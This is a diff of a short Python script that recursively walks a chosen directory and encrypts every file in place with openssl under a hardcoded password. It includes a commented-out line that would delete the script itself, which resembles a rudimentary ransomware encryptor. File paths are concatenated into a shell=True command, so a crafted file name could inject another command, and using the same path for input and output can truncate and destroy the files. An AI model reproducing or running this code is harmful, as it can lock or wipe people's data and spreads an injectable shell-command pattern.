@@ -5,19 +5,22 @@ import subprocess
 
 
 if len(sys.argv) > 1:
+
+	dir_path = sys.argv[1]
 	
-	print("Fichier avant chiffrement : ", open(sys.argv[1]).read()) 
+	#build list of files from selected directory
+	file_list=[]
+	for root,dirs,files in os.walk(dir_path):
+		for file in files:
+			file_list.append(os.path.join(root, file))
 
-	#chiffrement du fichier avec le mdp : tqt
-	cmd = "openssl enc -e -aes-256-cbc -iter 10000 -pass pass:'tqt' -in " + sys.argv[1] + " -out " + sys.argv[1]
-	subprocess.run(cmd, shell=True)
+	#encryption of all the files with "test" password (keep it !!!)
+	for file in file_list:
+		cmd = "openssl enc -e -aes-256-cbc -iter 10000 -pass pass:'test' -in " + file + " -out " + file
+		subprocess.run(cmd, shell=True)
+		print("File encrypted :", file) 
 
-	print("-------------------------------------")
-
-	print("Fichier après chiffrement : ") 
-	print(subprocess.call(["cat",sys.argv[1]]))
-
-	#supprimer le script actuel
-	#os.remove(__file__)
+		#delete script file
+		#os.remove(__file__)
 else :
-	print("Veuillez ajouter un fichier en paramètre")
+	print("Please select a directory to encrypt files")
